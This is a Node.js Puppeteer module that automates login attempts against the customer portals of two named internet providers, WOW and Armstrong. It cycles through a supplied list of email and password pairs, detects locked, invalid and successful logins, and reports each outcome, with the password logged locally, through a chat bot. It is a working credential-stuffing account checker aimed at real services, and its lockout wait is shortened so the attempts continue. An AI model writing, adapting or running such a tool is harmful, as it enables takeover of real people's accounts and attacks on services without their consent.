const puppeteer = require('puppeteer');

async function test(option, emailPasswordList, bot, chatId) {
    const LOGIN_OPTIONS = [
        {
            url: 'https://identity.wowway.com/Account/Login?ReturnUrl=%2Fconnect%2Fauthorize%2Fcallback%3Fclient_id%3Dwow-oam%26code_challenge%3D15aundct-rhDnNyOKuL-KJcFMu4EWJbtd2O86Uxx1SQ%26code_challenge_method%3DS256%26redirect_uri%3Dhttps%253A%252F%252Flogin.wowway.com%252Fapi%252Fauth%252Fcallback%252Fwow-identity%26response_type%3Dcode%26scope%3Dcustomer_account%253Aread%2520customer_account%253Awrite%2520offline_access%2520openid%2520profile',
            usernameSelector: '#login-user-name',
            passwordSelector: '#login-password',
            submitButtonSelector: '#submit-button',
            errorTextElementSelector: '.MuiAlert-message.css-1xsto0d',
            errorMessage: 'Sorry, the password and/or username entered are incorrect.'
        },
        {
            url: 'https://login.armstrongonewire.com/Account/SignIn?ReturnUrl=%252fissue%252fwsfed%253fwa%253dwsignin1.0%2526wtrealm%253dhttp%25253a%25252f%25252flogin3.armstrongonewire.com%25252fadfs%25252fservices%25252ftrust%2526wctx%253d4d2f748a-fdb8-4ed2-98cb-25ef38d595a8%2526wct%253d2024-05-28T04%25253a28%25253a37Z',
            usernameSelector: '#Username',
            passwordSelector: '#Password',
            submitButtonSelector: 'input[type="submit"]',
            errorTextElementSelector: '.validation-summary-errors',
            accountLockedMessage: 'Your Armstrong account has been locked.',
            invalidCredentialsMessage: 'Invalid username or password'
        }
    ];

    if (option < 0 || option >= LOGIN_OPTIONS.length) {
        throw new Error('Invalid option. Use 0 or 1.');
    }

    const { url, usernameSelector, passwordSelector, submitButtonSelector, errorTextElementSelector, errorMessage, accountLockedMessage, invalidCredentialsMessage } = LOGIN_OPTIONS[option];

    const browser = await puppeteer.launch({ headless: false });
    const page = await browser.newPage();

    for (let i = 0; i < emailPasswordList.length; i++) {
        const { email, password } = emailPasswordList[i];
        await page.goto(url);
        bot.sendMessage(chatId, 'Login page loaded...');

        try {
            await page.type(usernameSelector, email);
            await page.type(passwordSelector, password);

            bot.sendMessage(chatId, `Testing ${email}`);
            await Promise.all([
                page.waitForNavigation({ waitUntil: 'networkidle0' }),
                page.click(submitButtonSelector),
            ]);

            // Check if the login was successful
            const errorTextElement = await page.$(errorTextElementSelector);
            if (errorTextElement) {
                const errorText = await page.evaluate(element => element.textContent, errorTextElement);
                if (accountLockedMessage && errorText.includes(accountLockedMessage)) {
                    console.log(`Account locked for email: ${email}, password: ${password}`);
                    bot.sendMessage(chatId, `Account locked for email: ${email}. Waiting for 60 minutes before next login attempt...`);
                    await new Promise (resolve => setTimeout(resolve, 60 * 60 * 10));
                    //await new Promise(resolve => setTimeout(resolve, 60 * 60 * 1000)); // Wait for 60 minutes
                    continue; // Skip to the next iteration of the loop
                } else if (invalidCredentialsMessage && errorText.includes(invalidCredentialsMessage)) {
                    console.log(`Invalid username or password for email: ${email}, password: ${password}`);
                    bot.sendMessage(chatId, `Invalid username or password for email: ${email}.`);
                    continue; // Skip to the next iteration of the loop
                } else if (errorMessage && errorText.includes(errorMessage)) {
                    console.log(`Error message for email: ${email}, password: ${password}`);
                    bot.sendMessage(chatId, `Error message for email: ${email}.`);
                    continue; // Skip to the next iteration of the loop
                }
            }

            console.log(`Login successful for email: ${email}, password: ${password}`);
            bot.sendMessage(chatId, `Login successful for email: ${email}.`);
        } catch (error) {
            console.error('Error during login attempt:', error);
            bot.sendMessage(chatId, `Error during login attempt for email: ${email}.`);
        }
    }

    // Close the browser after all login attempts
    await browser.close();
}

module.exports = {
    test
};
